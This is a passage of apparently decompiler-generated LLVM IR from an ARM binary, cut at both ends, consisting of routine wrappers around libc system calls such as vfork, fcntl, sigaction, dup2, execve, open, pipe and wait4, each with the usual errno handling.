  uselistorder label %bb21, { 1, 0 }
}

define i32 @function_11120(i32 %arg1) local_unnamed_addr {
dec_label_pc_11120:
  %v0_11120 = call i32 @vfork()
  store i32 %v0_11120, i32* @r0, align 4
  %v2_11124 = icmp ugt i32 %v0_11120, -4097
  br i1 %v2_11124, label %bb1, label %bb

bb:                                               ; preds = %dec_label_pc_11138, %dec_label_pc_11120
  %merge = phi i32 [ %v0_11120, %dec_label_pc_11120 ], [ %v0_11138, %dec_label_pc_11138 ]
  ret i32 %merge

bb1:                                              ; preds = %dec_label_pc_11120
  %v4_11130 = icmp eq i32 %v0_11120, -38
  br i1 %v4_11130, label %dec_label_pc_11138, label %bb2

dec_label_pc_11138:                               ; preds = %bb1
  %v0_11138 = call i32 @fork()
  store i32 %v0_11138, i32* @r0, align 4
  %v2_1113c = icmp ugt i32 %v0_11138, -4097
  br i1 %v2_1113c, label %bb2, label %bb

bb2:                                              ; preds = %bb1, %dec_label_pc_11138
  %v0_11144 = call i32 @function_13918()
  %v1_1114c = inttoptr i32 %v0_11144 to %sigcontext*
  %v3_11150 = call i32 @sigreturn(%sigcontext* %v1_1114c)
  %v4_11150 = inttoptr i32 %v3_11150 to %sigcontext*
  %v3_11154 = call i32 @sigreturn(%sigcontext* %v4_11150)
  ret i32 %v3_11154

; uselistorder directives
  uselistorder i32 %v0_11138, { 1, 2, 0 }
  uselistorder i32 ()* @fork, { 1, 0 }
  uselistorder i32 -4097, { 1, 2, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_11158(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11158:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %v6_11158 = load i32, i32* @r2, align 4
  store i32 %arg2, i32* @ip, align 4
  %v1_11168 = add i32 %arg2, -12
  store i32 %v6_11158, i32* @r3, align 4
  %tmp = icmp ugt i32 %v1_11168, 2
  br i1 %tmp, label %dec_label_pc_11190, label %dec_label_pc_11188

dec_label_pc_11188:                               ; preds = %dec_label_pc_11158
  %v0_11188 = call i32 @function_111cc()
  br label %dec_label_pc_111bc

dec_label_pc_11190:                               ; preds = %dec_label_pc_11158
  %v2_11198 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_11198, i32* %r4.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_11198, -4095
  br i1 %tmp8, label %dec_label_pc_111bc, label %dec_label_pc_111a8

dec_label_pc_111a8:                               ; preds = %dec_label_pc_11190
  %v0_111a8 = call i32 @function_cec4()
  %v0_111ac = load i32, i32* %r4.global-to-local, align 4
  %v1_111ac = sub i32 0, %v0_111ac
  %v2_111b0 = inttoptr i32 %v0_111a8 to i32*
  store i32 %v1_111ac, i32* %v2_111b0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_111bc

dec_label_pc_111bc:                               ; preds = %dec_label_pc_111a8, %dec_label_pc_11190, %dec_label_pc_11188
  %storemerge = phi i32 [ %v0_11188, %dec_label_pc_11188 ], [ %v2_11198, %dec_label_pc_11190 ], [ -1, %dec_label_pc_111a8 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_11198, { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 2, 1 }
}

define i32 @function_111cc() local_unnamed_addr {
dec_label_pc_111cc:
  %r4.global-to-local = alloca i32, align 4
  %v0_111ec = load i32, i32* @r0, align 4
  store i32 %v0_111ec, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_111ec, -4095
  br i1 %tmp, label %dec_label_pc_11208, label %dec_label_pc_111f8

dec_label_pc_111f8:                               ; preds = %dec_label_pc_111cc
  %v0_111f8 = call i32 @function_cec4()
  %v0_111fc = load i32, i32* %r4.global-to-local, align 4
  %v1_111fc = sub i32 0, %v0_111fc
  %v2_11200 = inttoptr i32 %v0_111f8 to i32*
  store i32 %v1_111fc, i32* %v2_11200, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11208

dec_label_pc_11208:                               ; preds = %dec_label_pc_111cc, %dec_label_pc_111f8
  %v0_11208 = phi i32 [ %v0_111ec, %dec_label_pc_111cc ], [ -1, %dec_label_pc_111f8 ]
  ret i32 %v0_11208

; uselistorder directives
  uselistorder i32 %v0_111ec, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11208, { 1, 0 }
}

define i32 @function_1121c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1121c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1121c = load i32, i32* @r4, align 4
  store i32 %v3_1121c, i32* %stack_var_-8, align 4
  %v1_11220 = load i32, i32* @r1, align 4
  %v2_11220 = inttoptr i32 %v1_11220 to %sigaction*
  %v3_11220 = load i32, i32* @r2, align 4
  %v4_11220 = inttoptr i32 %v3_11220 to %sigaction*
  %v5_11220 = call i32 @sigaction(i32 %arg1, %sigaction* %v2_11220, %sigaction* %v4_11220)
  store i32 %v5_11220, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_11220, -4095
  br i1 %tmp, label %dec_label_pc_11240, label %dec_label_pc_11230

dec_label_pc_11230:                               ; preds = %dec_label_pc_1121c
  %v0_11230 = call i32 @function_cec4()
  %v0_11234 = load i32, i32* %r4.global-to-local, align 4
  %v1_11234 = sub i32 0, %v0_11234
  %v2_11238 = inttoptr i32 %v0_11230 to i32*
  store i32 %v1_11234, i32* %v2_11238, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11240

dec_label_pc_11240:                               ; preds = %dec_label_pc_1121c, %dec_label_pc_11230
  %v0_11240 = phi i32 [ %v5_11220, %dec_label_pc_1121c ], [ -1, %dec_label_pc_11230 ]
  %v2_11244 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11244, i32* %r4.global-to-local, align 4
  ret i32 %v0_11240

; uselistorder directives
  uselistorder i32 %v5_11220, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11240, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @function_11248(i32 %arg1) local_unnamed_addr #0 {
dec_label_pc_11248:
  store i32 %arg1, i32* @r5, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @function_11270(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11270:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11270 = load i32, i32* @r4, align 4
  store i32 %v3_11270, i32* %stack_var_-8, align 4
  %v2_11274 = call i32 @dup2(i32 %arg1, i32 %arg2)
  store i32 %v2_11274, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_11274, -4095
  br i1 %tmp, label %dec_label_pc_11294, label %dec_label_pc_11284

dec_label_pc_11284:                               ; preds = %dec_label_pc_11270
  %v0_11284 = call i32 @function_cec4()
  %v0_11288 = load i32, i32* %r4.global-to-local, align 4
  %v1_11288 = sub i32 0, %v0_11288
  %v2_1128c = inttoptr i32 %v0_11284 to i32*
  store i32 %v1_11288, i32* %v2_1128c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11294

dec_label_pc_11294:                               ; preds = %dec_label_pc_11270, %dec_label_pc_11284
  %v0_11294 = phi i32 [ %v2_11274, %dec_label_pc_11270 ], [ -1, %dec_label_pc_11284 ]
  %v2_11298 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11298, i32* @r4, align 4
  ret i32 %v0_11294

; uselistorder directives
  uselistorder i32 %v2_11274, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11294, { 1, 0 }
}

define i32 @function_1129c() local_unnamed_addr {
dec_label_pc_1129c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1129c = load i32, i32* @r4, align 4
  store i32 %v3_1129c, i32* %stack_var_-8, align 4
  %v0_112a0 = load i32, i32* @r0, align 4
  %v1_112a0 = inttoptr i32 %v0_112a0 to i8*
  %v2_112a0 = load i32, i32* @r1, align 4
  %v3_112a0 = inttoptr i32 %v2_112a0 to i8*
  %v4_112a0 = insertvalue [1 x i8*] undef, i8* %v3_112a0, 0
  %v5_112a0 = load i32, i32* @r2, align 4
  %v6_112a0 = inttoptr i32 %v5_112a0 to i8*
  %v7_112a0 = insertvalue [1 x i8*] undef, i8* %v6_112a0, 0
  %v8_112a0 = call i32 @execve(i8* %v1_112a0, [1 x i8*] %v4_112a0, [1 x i8*] %v7_112a0)
  store i32 %v8_112a0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v8_112a0, -4095
  br i1 %tmp, label %dec_label_pc_112c0, label %dec_label_pc_112b0

dec_label_pc_112b0:                               ; preds = %dec_label_pc_1129c
  %v0_112b0 = call i32 @function_cec4()
  %v0_112b4 = load i32, i32* %r4.global-to-local, align 4
  %v1_112b4 = sub i32 0, %v0_112b4
  %v2_112b8 = inttoptr i32 %v0_112b0 to i32*
  store i32 %v1_112b4, i32* %v2_112b8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_112c0

dec_label_pc_112c0:                               ; preds = %dec_label_pc_1129c, %dec_label_pc_112b0
  %v0_112c0 = phi i32 [ %v8_112a0, %dec_label_pc_1129c ], [ -1, %dec_label_pc_112b0 ]
  %v2_112c4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_112c4, i32* %r4.global-to-local, align 4
  ret i32 %v0_112c0

; uselistorder directives
  uselistorder i32 %v8_112a0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_112c0, { 1, 0 }
}

define i32 @function_112c8() local_unnamed_addr {
dec_label_pc_112c8:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_112c8 = load i32, i32* @r4, align 4
  store i32 %v3_112c8, i32* %stack_var_-8, align 4
  %v0_112d0 = load i32, i32* @r0, align 4
  store i32 %v0_112d0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_112d0, -4095
  br i1 %tmp, label %dec_label_pc_112ec, label %dec_label_pc_112dc

dec_label_pc_112dc:                               ; preds = %dec_label_pc_112c8
  %v0_112dc = call i32 @function_cec4()
  %v0_112e0 = load i32, i32* %r4.global-to-local, align 4
  %v1_112e0 = sub i32 0, %v0_112e0
  %v2_112e4 = inttoptr i32 %v0_112dc to i32*
  store i32 %v1_112e0, i32* %v2_112e4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_112f0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_112ec

dec_label_pc_112ec:                               ; preds = %dec_label_pc_112c8, %dec_label_pc_112dc
  %v2_112f0 = phi i32 [ %v3_112c8, %dec_label_pc_112c8 ], [ %v2_112f0.pre, %dec_label_pc_112dc ]
  %v0_112ec = phi i32 [ %v0_112d0, %dec_label_pc_112c8 ], [ -1, %dec_label_pc_112dc ]
  store i32 %v2_112f0, i32* @r4, align 4
  ret i32 %v0_112ec

; uselistorder directives
  uselistorder i32 %v0_112d0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_112ec, { 1, 0 }
}

define i32 @function_112f4() local_unnamed_addr {
dec_label_pc_112f4:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_112f4 = load i32, i32* @r4, align 4
  store i32 %v3_112f4, i32* %stack_var_-8, align 4
  %v0_112fc = load i32, i32* @r0, align 4
  store i32 %v0_112fc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_112fc, -4095
  br i1 %tmp, label %dec_label_pc_11318, label %dec_label_pc_11308

dec_label_pc_11308:                               ; preds = %dec_label_pc_112f4
  %v0_11308 = call i32 @function_cec4()
  %v0_1130c = load i32, i32* %r4.global-to-local, align 4
  %v1_1130c = sub i32 0, %v0_1130c
  %v2_11310 = inttoptr i32 %v0_11308 to i32*
  store i32 %v1_1130c, i32* %v2_11310, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1131c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11318

dec_label_pc_11318:                               ; preds = %dec_label_pc_112f4, %dec_label_pc_11308
  %v2_1131c = phi i32 [ %v3_112f4, %dec_label_pc_112f4 ], [ %v2_1131c.pre, %dec_label_pc_11308 ]
  %v0_11318 = phi i32 [ %v0_112fc, %dec_label_pc_112f4 ], [ -1, %dec_label_pc_11308 ]
  store i32 %v2_1131c, i32* @r4, align 4
  ret i32 %v0_11318

; uselistorder directives
  uselistorder i32 %v0_112fc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11318, { 1, 0 }
}

define i32 @function_11320(i32 %arg1) local_unnamed_addr {
dec_label_pc_11320:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11320 = load i32, i32* @r4, align 4
  store i32 %v3_11320, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_11344, label %dec_label_pc_11334

dec_label_pc_11334:                               ; preds = %dec_label_pc_11320
  %v0_11334 = call i32 @function_cec4()
  %v0_11338 = load i32, i32* %r4.global-to-local, align 4
  %v1_11338 = sub i32 0, %v0_11338
  %v2_1133c = inttoptr i32 %v0_11334 to i32*
  store i32 %v1_11338, i32* %v2_1133c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_11348.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11344

dec_label_pc_11344:                               ; preds = %dec_label_pc_11320, %dec_label_pc_11334
  %v2_11348 = phi i32 [ %v3_11320, %dec_label_pc_11320 ], [ %v2_11348.pre, %dec_label_pc_11334 ]
  %v0_11344 = phi i32 [ %arg1, %dec_label_pc_11320 ], [ -1, %dec_label_pc_11334 ]
  store i32 %v2_11348, i32* %r4.global-to-local, align 4
  ret i32 %v0_11344

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11344, { 1, 0 }
}

define i32 @function_1134c() local_unnamed_addr {
dec_label_pc_1134c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1134c = load i32, i32* @r4, align 4
  store i32 %v3_1134c, i32* %stack_var_-8, align 4
  %v0_11354 = load i32, i32* @r0, align 4
  store i32 %v0_11354, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11354, -4095
  br i1 %tmp, label %dec_label_pc_11370, label %dec_label_pc_11360

dec_label_pc_11360:                               ; preds = %dec_label_pc_1134c
  %v0_11360 = call i32 @function_cec4()
  %v0_11364 = load i32, i32* %r4.global-to-local, align 4
  %v1_11364 = sub i32 0, %v0_11364
  %v2_11368 = inttoptr i32 %v0_11360 to i32*
  store i32 %v1_11364, i32* %v2_11368, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_11374.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11370

dec_label_pc_11370:                               ; preds = %dec_label_pc_1134c, %dec_label_pc_11360
  %v2_11374 = phi i32 [ %v3_1134c, %dec_label_pc_1134c ], [ %v2_11374.pre, %dec_label_pc_11360 ]
  %v0_11370 = phi i32 [ %v0_11354, %dec_label_pc_1134c ], [ -1, %dec_label_pc_11360 ]
  store i32 %v2_11374, i32* %r4.global-to-local, align 4
  ret i32 %v0_11370

; uselistorder directives
  uselistorder i32 %v0_11354, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11370, { 1, 0 }
}

define i32 @function_11378(%timespec* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11378:
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to %timespec*
  %stack_var_-8 = alloca i32, align 4
  %v3_11378 = load i32, i32* @r4, align 4
  store i32 %v3_11378, i32* %stack_var_-8, align 4
  %v6_1137c = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp)
  store i32 %v6_1137c, i32* %r4.global-to-local, align 4
  %tmp6 = icmp ult i32 %v6_1137c, -4095
  br i1 %tmp6, label %dec_label_pc_1139c, label %dec_label_pc_1138c

dec_label_pc_1138c:                               ; preds = %dec_label_pc_11378
  %v0_1138c = call i32 @function_cec4()
  %v0_11390 = load i32, i32* %r4.global-to-local, align 4
  %v1_11390 = sub i32 0, %v0_11390
  %v2_11394 = inttoptr i32 %v0_1138c to i32*
  store i32 %v1_11390, i32* %v2_11394, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1139c

dec_label_pc_1139c:                               ; preds = %dec_label_pc_11378, %dec_label_pc_1138c
  %v0_1139c = phi i32 [ %v6_1137c, %dec_label_pc_11378 ], [ -1, %dec_label_pc_1138c ]
  %v2_113a0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_113a0, i32* %r4.global-to-local, align 4
  ret i32 %v0_1139c

; uselistorder directives
  uselistorder i32 %v6_1137c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1139c, { 1, 0 }
}

define i32 @function_113a4(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_113a4:
  %r4.global-to-local = alloca i32, align 4
  %v1_113b4 = and i32 %arg2, 64
  %v2_113b4 = icmp eq i32 %v1_113b4, 0
  br i1 %v2_113b4, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_113a4
  %v6_113a4 = load i32, i32* @r2, align 4
  %phitmp = urem i32 %v6_113a4, 65536
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_113a4, %bb
  %v0_113c4 = phi i32 [ 0, %dec_label_pc_113a4 ], [ %phitmp, %bb ]
  store i32 %v0_113c4, i32* @r2, align 4
  %v4_113cc = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %arg2)
  %v7_113d0 = icmp eq i32 %v4_113cc, -4096
  store i1 %v7_113d0, i1* @cpsr_z, align 1
  store i32 %v4_113cc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_113cc, -4095
  br i1 %tmp, label %dec_label_pc_113ec, label %dec_label_pc_113dc

dec_label_pc_113dc:                               ; preds = %.thread1
  %v0_113dc = call i32 @function_cec4()
  %v0_113e0 = load i32, i32* %r4.global-to-local, align 4
  %v1_113e0 = sub i32 0, %v0_113e0
  %v2_113e4 = inttoptr i32 %v0_113dc to i32*
  store i32 %v1_113e0, i32* %v2_113e4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_113ec

dec_label_pc_113ec:                               ; preds = %.thread1, %dec_label_pc_113dc
  %v0_113ec = phi i32 [ %v4_113cc, %.thread1 ], [ -1, %dec_label_pc_113dc ]
  ret i32 %v0_113ec

; uselistorder directives
  uselistorder i32 %v4_113cc, { 2, 0, 3, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_113ec, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_11400(i32 %arg1) local_unnamed_addr {
dec_label_pc_11400:
  store i32 %arg1, i32* @r2, align 4
  %v0_11408 = load i32, i32* @r0, align 4
  %v2_11408 = inttoptr i32 %v0_11408 to i8*
  %v3_11408 = call i32 @function_113a4(i8* %v2_11408, i32 577)
  %v0_1140c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1140c, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_11400
  %v6_1140c = and i32 %v3_11408, 36
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_11400, %bb
  %v7_1140c = phi i32 [ %v3_11408, %dec_label_pc_11400 ], [ %v6_1140c, %bb ]
  ret i32 %v7_1140c

; uselistorder directives
  uselistorder i32 (i8*, i32)* @function_113a4, { 0, 2, 1 }
  uselistorder i32 577, { 1, 0, 2 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_11410(i32 %arg1) local_unnamed_addr {
dec_label_pc_11410:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11410 = load i32, i32* @r4, align 4
  store i32 %v3_11410, i32* %stack_var_-8, align 4
  %v1_11414 = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_11414 = call i32 @pipe([2 x i32] %v1_11414)
  store i32 %v2_11414, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_11414, -4095
  br i1 %tmp, label %dec_label_pc_11434, label %dec_label_pc_11424

dec_label_pc_11424:                               ; preds = %dec_label_pc_11410
  %v0_11424 = call i32 @function_cec4()
  %v0_11428 = load i32, i32* %r4.global-to-local, align 4
  %v1_11428 = sub i32 0, %v0_11428
  %v2_1142c = inttoptr i32 %v0_11424 to i32*
  store i32 %v1_11428, i32* %v2_1142c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11434

dec_label_pc_11434:                               ; preds = %dec_label_pc_11410, %dec_label_pc_11424
  %v0_11434 = phi i32 [ %v2_11414, %dec_label_pc_11410 ], [ -1, %dec_label_pc_11424 ]
  %v2_11438 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11438, i32* @r4, align 4
  ret i32 %v0_11434

; uselistorder directives
  uselistorder i32 %v2_11414, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11434, { 1, 0 }
}

define i32 @function_1143c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1143c:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1143c = load i32, i32* @r4, align 4
  store i32 %v3_1143c, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_22cb4.542 to i32), i32* %r4.global-to-local, align 4
  %v2_11444 = load i32, i32* @global_var_22cb4.542, align 4
  %v2_11448 = icmp eq i32 %v2_11444, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_11448, label %dec_label_pc_11458, label %dec_label_pc_11464

dec_label_pc_11458:                               ; preds = %dec_label_pc_1143c
  %v2_11458 = call i32 @function_138dc(i32* null)
  %v1_1145c = icmp slt i32 %v2_11458, 0
  br i1 %v1_1145c, label %dec_label_pc_11484, label %dec_label_pc_11464thread-pre-split

dec_label_pc_11464thread-pre-split:               ; preds = %dec_label_pc_11458
  %v0_11468.pr = load i32, i32* %r5.global-to-local, align 4
  %v2_11464.pre = load i32, i32* @global_var_22cb4.542, align 4
  br label %dec_label_pc_11464

dec_label_pc_11464:                               ; preds = %dec_label_pc_11464thread-pre-split, %dec_label_pc_1143c
  %v2_11464 = phi i32 [ %v2_11464.pre, %dec_label_pc_11464thread-pre-split ], [ %v2_11444, %dec_label_pc_1143c ]
  %v1_11470 = phi i32 [ %v0_11468.pr, %dec_label_pc_11464thread-pre-split ], [ %arg1, %dec_label_pc_1143c ]
  %v2_11468 = icmp eq i32 %v1_11470, 0
  store i32 %v2_11464, i32* %r4.global-to-local, align 4
  br i1 %v2_11468, label %dec_label_pc_11488, label %dec_label_pc_11478

dec_label_pc_11478:                               ; preds = %dec_label_pc_11464
  %v2_11470 = add i32 %v1_11470, %v2_11464
  %v1_11478 = inttoptr i32 %v2_11470 to i32*
  %v2_11478 = call i32 @function_138dc(i32* %v1_11478)
  %v1_1147c = icmp slt i32 %v2_11478, 0
  br i1 %v1_1147c, label %dec_label_pc_11484, label %dec_label_pc_11478.dec_label_pc_11488_crit_edge

dec_label_pc_11478.dec_label_pc_11488_crit_edge:  ; preds = %dec_label_pc_11478
  %v0_11488.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11488

dec_label_pc_11484:                               ; preds = %dec_label_pc_11478, %dec_label_pc_11458
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11488

dec_label_pc_11488:                               ; preds = %dec_label_pc_11478.dec_label_pc_11488_crit_edge, %dec_label_pc_11464, %dec_label_pc_11484
  %v0_11488 = phi i32 [ %v0_11488.pre, %dec_label_pc_11478.dec_label_pc_11488_crit_edge ], [ %v2_11464, %dec_label_pc_11464 ], [ -1, %dec_label_pc_11484 ]
  %v2_1148c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1148c, i32* @r4, align 4
  ret i32 %v0_11488

; uselistorder directives
  uselistorder i32 %v2_11464, { 1, 0, 2 }
  uselistorder i32* null, { 0, 1, 2, 3, 7, 4, 5, 6, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder label %dec_label_pc_11488, { 2, 0, 1 }
}

define i32 @function_11494(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11494:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11494 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v3_11494, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_11494
  %v3_1149c5 = load i32, i32* @r4, align 4
  store i32 %v3_1149c5, i32* %stack_var_-8, align 4
  br label %dec_label_pc_114bc

bb:                                               ; preds = %dec_label_pc_11494
  %v3_1149c = load i32, i32* @r4, align 4
  store i32 %v3_1149c, i32* %stack_var_-8, align 4
  %tmp12 = icmp ult i32 %arg1, 3
  br i1 %tmp12, label %dec_label_pc_114bc, label %dec_label_pc_114a8

dec_label_pc_114a8:                               ; preds = %bb
  %v0_114a8 = call i32 @function_cec4()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_114b4 = inttoptr i32 %v0_114a8 to i32*
  store i32 22, i32* %v2_114b4, align 4
  %v0_114e0.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_114e0

dec_label_pc_114bc:                               ; preds = %.thread, %bb
  %v7_114bc = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp)
  store i32 %v7_114bc, i32* %r4.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_114bc, -4095
  br i1 %tmp13, label %dec_label_pc_114dc, label %dec_label_pc_114cc

dec_label_pc_114cc:                               ; preds = %dec_label_pc_114bc
  %v0_114cc = call i32 @function_cec4()
  %v0_114d0 = load i32, i32* %r4.global-to-local, align 4
  %v1_114d0 = sub i32 0, %v0_114d0
  %v2_114d4 = inttoptr i32 %v0_114cc to i32*
  store i32 %v1_114d0, i32* %v2_114d4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_114dc

dec_label_pc_114dc:                               ; preds = %dec_label_pc_114bc, %dec_label_pc_114cc
  %v0_114dc = phi i32 [ %v7_114bc, %dec_label_pc_114bc ], [ -1, %dec_label_pc_114cc ]
  store i32 %v0_114dc, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_114e0

dec_label_pc_114e0:                               ; preds = %dec_label_pc_114a8, %dec_label_pc_114dc
  %v0_114e0 = phi i32 [ %v0_114e0.pre, %dec_label_pc_114a8 ], [ %v0_114dc, %dec_label_pc_114dc ]
  %v2_114e4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_114e4, i32* @r4, align 4
  ret i32 %v0_114e0

; uselistorder directives
  uselistorder i32 %v7_114bc, { 1, 0, 2 }
  uselistorder i32* %stack_var_-8, { 1, 2, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_114e0, { 1, 0 }
  uselistorder label %dec_label_pc_114dc, { 1, 0 }
  uselistorder label %dec_label_pc_114bc, { 1, 0 }
}

define i32 @function_114e8() local_unnamed_addr {
dec_label_pc_114e8:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_114e8 = load i32, i32* @r4, align 4
  store i32 %v3_114e8, i32* %stack_var_-8, align 4
  %v0_114ec = load i32, i32* @r0, align 4
  %v1_114ec = load i32, i32* @r1, align 4
  %v2_114ec = load i32, i32* @r2, align 4
  %v3_114ec = load i32, i32* @r3, align 4
  %v4_114ec = inttoptr i32 %v3_114ec to %rusage*
  %v5_114ec = call i32 @wait4(i32 %v0_114ec, i32 %v1_114ec, i32 %v2_114ec, %rusage* %v4_114ec)
  store i32 %v5_114ec, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_114ec, -4095
  br i1 %tmp, label %dec_label_pc_1150c, label %dec_label_pc_114fc

dec_label_pc_114fc:                               ; preds = %dec_label_pc_114e8
  %v0_114fc = call i32 @function_cec4()
  %v0_11500 = load i32, i32* %r4.global-to-local, align 4
  %v1_11500 = sub i32 0, %v0_11500
  %v2_11504 = inttoptr i32 %v0_114fc to i32*
  store i32 %v1_11500, i32* %v2_11504, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1150c

dec_label_pc_1150c:                               ; preds = %dec_label_pc_114e8, %dec_label_pc_114fc
  %v0_1150c = phi i32 [ %v5_114ec, %dec_label_pc_114e8 ], [ -1, %dec_label_pc_114fc ]
  %v2_11510 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11510, i32* @r4, align 4
  ret i32 %v0_1150c

; uselistorder directives
  uselistorder i32 %v5_114ec, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1150c, { 1, 0 }
}

define i32 @function_11514() local_unnamed_addr {
dec_label_pc_11514:
  ret i32 ptrtoint (i32* @global_var_22c94.544 to i32)
}

define i32 @function_11520(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11520:
  %stack_var_-12 = alloca i32, align 4
